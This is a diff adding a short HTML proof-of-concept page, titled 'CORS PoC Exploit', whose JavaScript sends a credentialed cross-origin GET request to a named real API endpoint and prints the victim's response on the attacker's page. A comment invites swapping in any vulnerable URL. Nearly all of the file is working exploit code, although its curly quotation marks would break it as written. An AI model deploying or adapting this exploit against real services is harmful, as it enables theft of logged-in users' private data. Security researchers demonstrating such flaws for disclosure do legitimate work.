@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS PoC Exploit</title>
+</head>
+<body>
+<center>
+<h1>CORS Exploit<br>Pulkit Khandelwal</h1>
+<hr>
+<div id=”demo”>
+<button type=”button” onclick=”cors()”>Exploit</button>
+</div>
+<script type=”text/javascript”>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if(this.readyState == 4 && this.status == 200) {
+document.getElementById(“demo”).innerHTML = this.responseText;
+}
+};
+xhttp.open(“GET”, “https://api.edmodo.com/users/id", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</center>
+</body>
+</html>
+
+<!--After GET, u can paste the url that is vulnerable-->
